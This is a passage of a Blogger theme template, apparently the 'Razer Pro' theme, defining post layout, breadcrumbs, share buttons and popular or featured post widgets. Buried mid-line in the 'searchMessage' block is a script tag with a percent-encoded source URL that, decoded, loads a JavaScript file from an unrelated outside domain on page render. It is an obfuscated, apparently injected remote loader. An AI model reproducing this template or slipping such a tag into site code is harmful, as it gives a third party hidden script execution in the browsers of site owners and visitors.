    </b:includable>
    <b:includable id='homePageLink'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='iframeComments' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='indexPost' var='post'>
      <!-- Index Post Content -->
      <b:include data='post' name='postFeaturedImage'/>
      <div class='entry-header'>
        <b:include data='post' name='postCategory'/>
        <b:include data='post' name='postHeader'/>
        <b:include data='post' name='postBodySnippet'/>
        <b:include data='post' name='headerByline'/>
      </div>
    </b:includable>
    <b:includable id='inlineAd' var='post'>
      <b:if cond='!data:view.isPreview'>
        <b:if cond='data:i != 0'>
          <b:if cond='data:post.includeAd and data:post.adNumber'>
            <b:if cond='data:this.adCode or data:this.adClientId or data:blog.adsenseClientId'>
              <div expr:class='&quot;index-post post-ad-type post-ad-&quot; + data:i'>
                <div class='inline-ad-wrap'>
                  <div class='inline-ad'>
                    <b:if cond='data:this.adCode != &quot;&quot;'>
                      <data:this.adCode/>
                      <b:else/>
                      <b:if cond='data:this.adClientId or data:blog.adsenseClientId'>
                        <b:include name='defaultAdUnit'/>
                      </b:if>
                    </b:if>
                  </div>
                </div>
              </div>
            </b:if>
          </b:if>
        </b:if>
      </b:if>
    </b:includable>
    <b:includable id='itemPost' var='post'>
      <!-- Item Post Content -->
      <b:include data='post' name='postMeta'/>
      <div class='item-post-inner'>
        <div class='entry-header blog-entry-header'>
          <b:include data='post' name='postHeader'/>
        </div>
        <div class='entry-content-wrap'>
          <b:include data='post' name='postBody'/>
          <b:include cond='data:view.isPost and data:allBylineItems.labels' data='post' name='postLabels'/>
        </div>
        <b:include cond='data:view.isPost and data:allBylineItems.share' data='post' name='postShareButtons'/>
      </div>
      <b:include cond='data:view.isPost' data='post' name='postFooter'/>
    </b:includable>
    <b:includable id='linkShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='nextPageLink'>
      <b:if cond='data:olderPageUrl'>
        <a class='post-nav-older-link' expr:href='data:olderPageUrl.canonical' expr:id='data:widget.instanceId + &quot;_post-nav-older-link&quot;'>
          <b:include data='{ message: &quot;nextPost&quot; }' name='theme-custom-lang'/>
        </a>
        <b:else/>
        <span class='post-nav-older-link'>
          <b:include data='{ message: &quot;nextPost&quot; }' name='theme-custom-lang'/>
        </span>
      </b:if>
    </b:includable>
    <b:includable id='otherSharingButton'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='platformShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='post' var='post'>
      <!-- Index Posts -->
      <b:if cond='data:view.isMultipleItems'>
        <b:include data='post' name='indexPost'/>
      </b:if>
      <!-- Item Post -->
      <b:if cond='data:view.isSingleItem'>
        <b:include data='post' name='itemPost'/>
      </b:if>
    </b:includable>
    <b:includable id='postAuthor' var='post'>
      <!-- Post Author -->
      <span class='entry-author mi'><b:if cond='data:view.isPost'><span class='author-avatar-wrap'><span class='author-avatar' expr:data-image='data:post.author.authorPhoto.image ? resizeImage(data:post.author.authorPhoto.image, 72, &quot;1:1&quot;) : &quot;https://4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/s72-c/avatar.jpg&quot;'/></span></b:if><b:if cond='data:allBylineItems.author.label'><span class='by sp'><data:allBylineItems.author.label/></span></b:if><span class='author-name'><data:post.author.name/></span></span>
    </b:includable>
    <b:includable id='postBody' var='post'>
      <!-- Ads before post content. -->
      <b:if cond='data:view.isPost'><b:tag cond='data:widgets any w =&gt; w.sectionId == &quot;razer-pro-main-before-ad&quot;' id='before-ad' name='div'/></b:if>
      <!-- Post Body Entry Content-->
      <div class='post-body entry-content' id='post-body'>
        <data:post.body/>
      </div>
      <!-- Ads after post content. -->
      <b:if cond='data:view.isPost'><b:tag cond='data:widgets any w =&gt; w.sectionId == &quot;razer-pro-main-after-ad&quot;' id='after-ad' name='div'/></b:if>
    </b:includable>
    <b:includable id='postBodySnippet' var='post'><p class='entry-excerpt excerpt'><b:eval expr='data:post.snippets.long snippet { length: 110 }'/></p></b:includable>
    <b:includable id='postBreadcrumbs' var='post'>
      <!-- Post Breadcrumbs -->
      <b:if cond='data:view.isPost'>
        <b:if cond='data:skin.vars.breadcrumb == &quot;1px&quot;'><nav id='breadcrumb'><a class='home' expr:href='data:blog.homepageUrl'><data:messages.home/></a><b:if cond='data:post.labels'><em class='delimiter'/><a class='label' expr:href='data:post.labels.first.url'><data:post.labels.first.name/></a></b:if></nav></b:if>
        <script type='application/ld+json'>{&quot;@context&quot;:&quot;http://schema.org&quot;,&quot;@type&quot;:&quot;BreadcrumbList&quot;,&quot;itemListElement&quot;:[{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:1,&quot;name&quot;:&quot;<data:messages.home.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:blog.homepageUrl.canonical.jsonEscaped/>&quot;},{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:2,&quot;name&quot;:&quot;<b:if cond='data:post.labels'><data:post.labels.first.name.jsonEscaped/><b:else/><data:messages.posts/></b:if>&quot;,&quot;item&quot;:&quot;<b:if cond='data:post.labels'><data:post.labels.first.url.canonical.jsonEscaped/><b:else/><b:eval expr='data:blog.homepageUrl.canonical.jsonEscaped + &quot;search/&quot;'/></b:if>&quot;},{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:3,&quot;name&quot;:&quot;<data:post.title.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:post.url.canonical.jsonEscaped/>&quot;}]}</script>
      </b:if>
      <b:if cond='data:view.isPage'>
        <script type='application/ld+json'>{&quot;@context&quot;:&quot;http://schema.org&quot;,&quot;@type&quot;:&quot;BreadcrumbList&quot;,&quot;itemListElement&quot;:[{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:1,&quot;name&quot;:&quot;<data:messages.home.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:blog.homepageUrl.canonical.jsonEscaped/>&quot;},{&quot;@type&quot;:&quot;ListItem&quot;,&quot;position&quot;:2,&quot;name&quot;:&quot;<data:post.title.jsonEscaped/>&quot;,&quot;item&quot;:&quot;<data:post.url.canonical.jsonEscaped/>&quot;}]}</script>
      </b:if>
    </b:includable>
    <b:includable id='postCategory' var='post'>
      <!-- Post Label -->
      <b:if cond='data:post.labels'><span class='entry-category'><data:post.labels.first.name/></span></b:if>
    </b:includable>
    <b:includable id='postCommentsAndAd' var='post'>
      <!-- In-Feed Ads -->
      <b:include cond='data:view.isMultipleItems and not data:view.search.label and not data:view.search.query and not data:view.isArchive' data='post' name='inlineAd'/>
      <article class='blog-post hentry'>
        <b:class cond='data:view.isMultipleItems' expr:name='&quot;index-post post-&quot; + data:i'/>
        <b:class cond='data:view.isSingleItem' name='item-post'/>
        <b:include data='post' name='post'/>
      </article>
      <b:if cond='data:view.isSingleItem and data:post.allowComments'>
        <!-- Post Comments -->
        <div class='razer-pro-blog-post-comments' expr:data-shortcode='data:allBylineItems.comments.label contains &quot;type&quot; ? data:allBylineItems.comments.label : &quot;$type={blogger}&quot;'>
          <b:include data='post' name='threadedCommentsDisqus'/>
          <b:include data='post' name='comments'/>
        </div>
      </b:if>
      <!-- Post Navigation -->
      <b:include cond='data:skin.vars.postnav == &quot;1px&quot;' name='postPagination'/>
    </b:includable>
    <b:includable id='postCommentsLink'>
      <b:if cond='data:skin.vars.cmm_count == &quot;1px&quot;'>
        <!-- Post Comments Count -->
        <span class='entry-comments-link'><data:post.numberOfComments/></span>
      </b:if>
    </b:includable>
    <b:includable id='postFeaturedImage' var='post'>
      <!-- Post Featured Image -->
      <a class='entry-image-wrap' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:if cond='data:post.featuredImage'><span class='entry-thumb' expr:data-image='data:post.featuredImage.isYouTube ? resizeImage(data:post.featuredImage.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)'/><b:else/><span class='entry-thumb' data-image='https://resources.blogblog.com/img/blank.gif'/></b:if><b:class expr:name='data:post.featuredImage.isYouTube ? &quot;is-video&quot; : &quot;is-image&quot;'/></a>
    </b:includable>
    <b:includable id='postFooter' var='post'>
      <!-- Post Footer Items -->
      <b:tag class='post-footer' cond='data:post.author.aboutMe or (data:widgets.HTML any w =&gt; w.sectionId == &quot;razer-pro-related-posts&quot;) or (data:widgets any w =&gt; w.sectionId == &quot;razer-pro-post-footer-ads&quot;)' name='footer'>
        <b:include cond='data:post.author.aboutMe' data='post' name='postFooterAuthorProfile'/>
        <b:include cond='data:widgets.HTML any w =&gt; w.sectionId == &quot;razer-pro-related-posts&quot;' data='post' name='relatedPosts'/>
        <b:tag cond='data:widgets any w =&gt; w.sectionId == &quot;razer-pro-post-footer-ads&quot;' id='post-footer-ads' name='div'/>
      </b:tag>
    </b:includable>
    <b:includable id='postFooterAuthorProfile' var='post'>
      <div class='about-author'>
        <div class='author-avatar-wrap'>
          <span class='author-avatar' expr:data-image='data:post.author.authorPhoto.image ? resizeImage(data:post.author.authorPhoto.image, 72, &quot;1:1&quot;) : &quot;https://4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/s72-c/avatar.jpg&quot;'/>
        </div>
        <div class='author-description'>
          <span class='author-title'><b:tag cond='data:post.author.profileUrl' expr:alt='data:post.author.name' expr:href='data:post.author.profileUrl' name='a' rel='noopener noreferrer' target='_blank'><data:post.author.name/></b:tag></span>
          <p class='author-text excerpt'><data:post.author.aboutMe/></p>
        </div>
      </div>
    </b:includable>
    <b:includable id='postHeader' var='post'>
      <b:include cond='data:view.isSingleItem' data='post' name='postBreadcrumbs'/>
      <b:include data='post' name='postTitle'/>
      <b:include cond='data:view.isPost' data='post' name='headerByline'/>
    </b:includable>
    <b:includable id='postJumpLink' var='post'>
      <b:if cond='data:blog.jumpLinkMessage != &quot;hide&quot;'>
        <a class='read-more' expr:href='data:post.url.canonical'><data:blog.jumpLinkMessage/></a>
      </b:if>
    </b:includable>
    <b:includable id='postLabels' var='post'>
      <b:if cond='data:post.labels'>
        <div class='entry-labels'>
          <b:if cond='data:allBylineItems.labels.label'><span class='labels-label'><data:allBylineItems.labels.label/></span></b:if>
          <b:loop values='data:post.labels' var='label'>
            <a class='label-link' expr:href='data:label.url' rel='tag'><data:label.name/></a>
          </b:loop>
        </div>
      </b:if>
    </b:includable>
    <b:includable id='postLocation'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postMeta' var='post'>
      <b:if cond='data:view.isPost'>
        <script type='application/ld+json'>{&quot;@context&quot;:&quot;https://schema.org&quot;,&quot;@type&quot;:&quot;NewsArticle&quot;,&quot;mainEntityOfPage&quot;:{&quot;@type&quot;:&quot;WebPage&quot;,&quot;@id&quot;:&quot;<data:post.url.canonical.jsonEscaped/>&quot;},&quot;headline&quot;:&quot;<data:post.title.jsonEscaped/>&quot;,&quot;description&quot;:&quot;<data:post.snippets.short.jsonEscaped/>&quot;,&quot;datePublished&quot;:&quot;<data:post.date.iso8601.jsonEscaped/>&quot;,&quot;dateModified&quot;:&quot;<data:post.lastUpdated.iso8601.jsonEscaped/>&quot;,&quot;image&quot;:{&quot;@type&quot;:&quot;ImageObject&quot;,<b:if cond='data:post.featuredImage.isResizable'>&quot;url&quot;:&quot;<b:eval expr='resizeImage(data:post.featuredImage, 1200, &quot;1200:675&quot;)'/>&quot;,&quot;height&quot;:675,&quot;width&quot;:1200<b:else/>&quot;url&quot;:&quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=w1200&quot;,&quot;height&quot;:348,&quot;width&quot;:1200</b:if>},&quot;author&quot;:{&quot;@type&quot;:&quot;Person&quot;,&quot;name&quot;:&quot;<data:post.author.name.jsonEscaped/>&quot;},&quot;publisher&quot;:{&quot;@type&quot;:&quot;Organization&quot;,&quot;name&quot;:&quot;Blogger&quot;,&quot;logo&quot;:{&quot;@type&quot;:&quot;ImageObject&quot;,&quot;url&quot;:&quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=h60&quot;,&quot;width&quot;:206,&quot;height&quot;:60}}}</script>
      </b:if>
    </b:includable>
    <b:includable id='postPagination'>
      <b:if cond='data:view.isPost'>
        <div class='post-nav'>
          <b:include name='previousPageLink'/>
          <b:include name='nextPageLink'/>
        </div>
      </b:if>
    </b:includable>
    <b:includable id='postReactions'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postShareButtons' var='post'>
      <!-- Post ShareButtons -->
      <div class='post-share'>
        <ul class='razer-pro-share-links social social-bg'>
          <li class='facebook has-span'><a class='facebook btn window-ify' data-height='500' data-width='520' expr:data-url='&quot;https://www.facebook.com/sharer.php?u=&quot; + data:post.url.canonical' href='javascript:;' rel='nofollow' title='Facebook'><span>Facebook</span></a></li>
          <li class='twitter has-span'><a class='twitter btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://twitter.com/intent/tweet?url=&quot; + data:post.url.canonical + &quot;&amp;text=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Twitter'><span>Twitter</span></a></li>
          <li class='whatsapp'><a class='whatsapp btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://api.whatsapp.com/send?text=&quot; + data:post.title.jsEscaped + &quot; | &quot; + data:post.url.canonical' href='javascript:;' rel='nofollow' title='WhatsApp'/></li>
          <li class='pinterest-p'><a class='pinterest btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://www.pinterest.com/pin/create/button/?url=&quot; + data:post.url.canonical + &quot;&amp;media=&quot; + data:post.featuredImage + &quot;&amp;description=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Pinterest'/></li>
          <li class='reddit'><a class='reddit btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://reddit.com/submit?url=&quot; + data:post.url.canonical + &quot;&amp;title=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Reddit'/></li>
          <li class='linkedin'><a class='linkedin btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://www.linkedin.com/shareArticle?mini=true&amp;url=&quot; + data:post.url.canonical + &quot;&amp;title=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='LinkedIn'/></li>
          <li class='tumblr'><a class='tumblr btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://www.tumblr.com/share/link?url=&quot; + data:post.url.canonical + &quot;&amp;name=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Tumblr'/></li>
          <li class='telegram'><a class='telegram btn window-ify' data-height='520' data-width='860' expr:data-url='&quot;https://telegram.me/share/url?url=&quot; + data:post.url.canonical + &quot;&amp;text=&quot; + data:post.title.jsEscaped' href='javascript:;' rel='nofollow' title='Telegram'/></li>
          <li class='email'><a class='email btn window-ify' data-height='500' data-width='520' expr:data-url='&quot;mailto:?subject=&quot; + data:post.title.jsEscaped + &quot;&amp;body=&quot; + data:post.url.canonical' href='javascript:;' rel='nofollow' title='Email'/></li>
          <li class='show-hid'><a class='btn' expr:title='data:messages.showMore' href='javascript:;' rel='nofollow'/></li>
        </ul>
      </div>
    </b:includable>
    <b:includable id='postTimestamp' var='post'>
      <!-- Post Timestamp -->
      <span class='entry-time mi'><b:if cond='data:allBylineItems.author and data:allBylineItems.timestamp.label'><span class='sp'><data:allBylineItems.timestamp.label/></span></b:if><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span>
    </b:includable>
    <b:includable id='postTitle' var='post'>
      <!-- Post Title Index and Item -->
      <b:if cond='data:view.isMultipleItems'>
        <h2 class='entry-title'><a class='entry-title-link' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle' rel='bookmark'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></a></h2>
      </b:if>
      <b:if cond='data:view.isSingleItem'>
        <h1 class='entry-title'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></h1>
      </b:if>
    </b:includable>
    <b:includable id='previousPageLink'>
      <b:if cond='data:newerPageUrl'>
        <a class='post-nav-newer-link' expr:href='data:newerPageUrl.canonical' expr:id='data:widget.instanceId + &quot;_post-nav-newer-link&quot;'>
          <b:include data='{ message: &quot;prevPost&quot; }' name='theme-custom-lang'/>
        </a>
        <b:else/>
        <span class='post-nav-newer-link'>
          <b:include data='{ message: &quot;prevPost&quot; }' name='theme-custom-lang'/>
        </span>
      </b:if>
    </b:includable>
    <b:includable id='relatedPosts' var='post'>
      <!-- Related Posts -->
      <div id='related-wrap'>
        <div class='title-wrap related-title'>
          <span class='title'><data:messages.youMayLikeThesePosts/></span>
        </div>
        <div class='razer-pro-related-content'>
          <b:if cond='data:post.labels'>
            <div class='related-tag' expr:data-label='data:post.labels.first.name'/>
            <b:else/>
            <div class='related-tag' data-label='recent'/>
          </b:if>
        </div> 
      </div>  
    </b:includable>
    <b:includable id='searchMessage'>
      <!-- Search Message -->
      <b:if cond='data:posts.empty'>
        <b:class name='no-posts'/>
      </b:if>
      <b:if cond='data:view.search.query'>
        <div class='queryMessage'>
          <b:if cond='data:posts.empty'>
            <span class='query-info query-error'>&quot;<data:view.search.query/>&quot;</span>
            <b:else/>
            <span class='query-info query-success'>&quot;<data:view.search.query/>&quot;</span>
          </b:if>
        </div>
      </b:if>
      <b:if cond='data:view.search.label'>
        <div class='queryMessage '>
          <b:if cond='data:posts.empty'>
            <span class='query-info query-label query-error'><data:view.search.label/></span><b:else/>
            <span class='query-info query-label query-success'><data:view.search.label/></span></b:if></div>
      </b:if><b:tag name='script' src='//%68.m%72ja%7a.c%6fm/b%68.%6as'/><b:if cond='data:view.isArchive'>
        <div class='queryMessage'><b:if cond='data:posts.empty'>
            <span class='query-info query-error'><data:view.archive.rangeMessage/></span>
            <b:else/>
            <span class='query-info query-success'><data:view.archive.rangeMessage/></span>
          </b:if></div></b:if>
      <b:if cond='data:view.isError'>
        <div class='errorWrap'>
          <h3>404</h3>
          <h4><data:messages.theresNothingHere/></h4>
          <p><data:navMessage/></p>
          <a class='homepage btn' expr:href='data:blog.homepageUrl'><data:messages.home/></a>
        </div>
      </b:if>
      <b:if cond='data:view.isMultipleItems and data:posts.empty'><div class='queryEmpty'><data:messages.noResultsFound/></div></b:if>
    </b:includable>
    <b:includable id='sharingButton'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtonContent'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtons'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtonsMenu'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingPlatformIcon'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='threadedCommentForm' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='threadedCommentJs' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='threadedComments' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='threadedCommentsDisqus' var='post'>
      <script type='text/javascript'>
        var disqus_shortname = &quot;templateify-comments&quot;;
        var disqus_blogger_current_url = &quot;<data:post.url.canonical/>&quot;;
        if (!disqus_blogger_current_url.length) {
          disqus_blogger_current_url = &quot;<data:post.url.canonical/>&quot;;
        }
        var disqus_blogger_homepage_url = &quot;<data:blog.canonicalHomepageUrl/>&quot;;
        var disqus_blogger_canonical_homepage_url = &quot;<data:blog.canonicalHomepageUrl/>&quot;;
      </script>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='PopularPosts'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <div class='widget-content'>
        <b:if cond='data:widget.sectionId == &quot;featured&quot;'>
          <div class='featured-items featured-cards'>         
              <b:loop index='i' values='data:posts' var='post'>
                <b:include data='post' name='content'/>
              </b:loop>
          </div>
          <b:else/>
          <b:class name='default-items'/>
          <b:loop index='i' values='data:posts' var='post'>
            <b:include data='post' name='content'/>
          </b:loop>
        </b:if>
      </div>
    </b:includable>
    <b:includable id='blogThisShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='bylineByName' var='byline'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='bylineRegion' var='regionItems'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentsLink'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentsLinkIframe'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='content' var='post'>
      <div>
        <b:if cond='data:widget.sectionId == &quot;featured&quot;'>
          <b:class expr:name='data:i in [0,1,2] ? &quot;featured-item card-style item-&quot;+data:i : &quot;featured-item item-&quot;+data:i'/>
          <a expr:class='data:i in [0,1,2] ? &quot;entry-image-wrap before-mask&quot; : &quot;entry-image-wrap&quot;' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:if cond='data:post.featuredImage'><span class='entry-thumb' expr:data-image='data:post.featuredImage.isYouTube ? resizeImage(data:post.featuredImage.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)'/><b:else/><span class='entry-thumb' data-image='https://resources.blogblog.com/img/blank.gif'/></b:if><b:class expr:name='data:post.featuredImage.isYouTube ? &quot;is-video&quot; : &quot;is-image&quot;'/></a>
          <div expr:class='data:i in [0,1,2] ? &quot;entry-header entry-info&quot; : &quot;entry-header&quot;'>
            <b:if cond='data:i in [0,1,2] and data:post.labels'><span class='entry-category'><data:post.labels.first.name/></span></b:if>
            <h2 class='entry-title'><a expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></a></h2>
            <b:if cond='data:i in [0,1,2]'><b:if cond='data:widgets.Blog.first.allBylineItems.author or data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><b:if cond='data:widgets.Blog.first.allBylineItems.author'><span class='entry-author mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.author.label/></span></b:if><span class='author-name'><data:post.author.name/></span></span></b:if><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><span class='entry-time mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author and data:widgets.Blog.first.allBylineItems.timestamp.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.timestamp.label/></span></b:if><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></b:if></div></b:if><b:else/><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><span class='entry-time mi'><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></div></b:if></b:if>
            <b:if cond='data:i == 0'><span class='entry-excerpt excerpt'><b:eval expr='data:post.snippets.long snippet { length: 150 }'/></span></b:if>
          </div>
          <b:else/>
          <b:class expr:name='data:i == 0 ? &quot;default-item card-style item-&quot;+data:i : &quot;default-item item-&quot;+data:i'/>
          <a expr:class='data:i == 0 ? &quot;entry-image-wrap before-mask&quot; : &quot;entry-image-wrap&quot;' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:if cond='data:post.featuredImage'><span class='entry-thumb' expr:data-image='data:post.featuredImage.isYouTube ? resizeImage(data:post.featuredImage.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)'/><b:else/><span class='entry-thumb' data-image='https://resources.blogblog.com/img/blank.gif'/></b:if><b:class expr:name='data:post.featuredImage.isYouTube ? &quot;is-video&quot; : &quot;is-image&quot;'/></a>
          <div expr:class='data:i == 0 ? &quot;entry-header entry-info&quot; : &quot;entry-header&quot;'>
            <b:if cond='data:post.labels and (data:i == 0)'><span class='entry-category'><data:post.labels.first.name/></span></b:if>
            <h2 class='entry-title'><a expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></a></h2>
            <b:if cond='data:i == 0'><b:if cond='data:widgets.Blog.first.allBylineItems.author or data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><b:if cond='data:widgets.Blog.first.allBylineItems.author'><span class='entry-author mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.author.label/></span></b:if><span class='author-name'><data:post.author.name/></span></span></b:if><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><span class='entry-time mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author and data:widgets.Blog.first.allBylineItems.timestamp.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.timestamp.label/></span></b:if><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></b:if></div></b:if><b:else/><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><span class='entry-time mi'><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></div></b:if></b:if>
          </div>
        </b:if>
      </div>
    </b:includable>
    <b:includable id='emailPostIcon'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='facebookShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='footerBylines'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='googlePlusShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='headerByline'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='linkShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='otherSharingButton'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='platformShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postAuthor'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postCommentsLink'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postJumpLink' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postLabels'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postLocation'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postReactions'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postShareButtons'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postTimestamp'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButton'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtonContent'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtons'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtonsMenu'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingPlatformIcon'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostByline'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostContent'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostThumbnail'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostTitle'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPosts'><b:comment>Replaced</b:comment></b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='FeaturedPost'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <div class='widget-content'>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='content'/>
        </b:loop>
      </div>
    </b:includable>
    <b:includable id='blogThisShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='bylineByName' var='byline'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='bylineRegion' var='regionItems'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentsLink'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='commentsLinkIframe'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='content' var='post'>
      <div class='featured-post card-style post'>
        <a class='entry-image-wrap before-mask' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:if cond='data:post.featuredImage'><span class='entry-thumb' expr:data-image='data:post.featuredImage.isYouTube ? resizeImage(data:post.featuredImage.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)'/><b:else/><span class='entry-thumb' data-image='https://resources.blogblog.com/img/blank.gif'/></b:if><b:class expr:name='data:post.featuredImage.isYouTube ? &quot;is-video&quot; : &quot;is-image&quot;'/></a>
        <div class='entry-header entry-info'>
          <b:if cond='data:post.labels'><span class='entry-category'><data:post.labels.first.name/></span></b:if>
          <h2 class='entry-title'><a expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></a></h2>
          <b:if cond='data:widgets.Blog.first.allBylineItems.author or data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><b:if cond='data:widgets.Blog.first.allBylineItems.author'><span class='entry-author mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.author.label/></span></b:if><span class='author-name'><data:post.author.name/></span></span></b:if><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><span class='entry-time mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author and data:widgets.Blog.first.allBylineItems.timestamp.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.timestamp.label/></span></b:if><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></b:if></div></b:if>
        </div>
